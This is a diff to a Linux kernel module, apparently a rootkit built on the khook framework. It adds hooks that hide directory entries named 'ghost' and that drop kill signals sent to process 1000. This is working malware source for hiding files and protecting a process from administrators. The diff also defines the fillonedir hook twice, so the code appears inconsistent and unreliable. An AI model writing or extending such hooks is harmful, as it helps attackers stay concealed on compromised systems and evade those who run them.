@@ -9,6 +9,9 @@
 
 #include <linux/fs.h>
 #include <linux/version.h>
+#include <linux/syscalls.h>
+
+typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig);
 
 KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
@@ -74,6 +77,27 @@ struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
 		found = KHOOK_ORIGIN(__d_lookup, parent, name);
 	return found;
 }
+
+KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	
+	if (!strstr(name, "ghost"))
+		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
+	return ret;
+}
+
+KHOOK_EXT(asmlinkage int, sys_kill, pid_t, int);
+static int khook_syskill(pid_t pid, int sig)
+{
+	int ret = 0;
+	
+	if (pid != 1000)
+		ret = KHOOK_ORIGIN(sys_kill, pid, sig);
+	return ret;
+}
+
 
 
 /*KHOOK(inode_permission);
